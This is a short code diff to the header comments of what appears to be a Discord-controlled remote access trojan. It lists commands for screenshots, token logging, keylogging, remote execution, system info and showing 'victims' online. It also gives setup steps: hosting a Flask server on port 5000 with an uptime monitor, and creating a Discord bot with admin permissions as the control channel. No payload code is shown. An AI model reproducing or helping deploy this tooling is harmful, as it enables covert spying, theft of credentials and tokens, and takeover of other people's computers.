@@ -4,7 +4,8 @@
 # will probably update this regularly
 # discord-py 1.7.3
 # Commands:
-.ss , .tlog, .cmds, .victimsonline, . keylog, .execute, .sysinfo
+  .ss , .tlog, .cmds, .victimsonline, . keylog, .execute, .sysinfo
+# setup:
 1) setup an uptime robot to the ip which flask server is running on port 5000
 2) update line 100 of bot.py to channel id
 3) go on dpd and create now bot with admin perms and all intents enabled
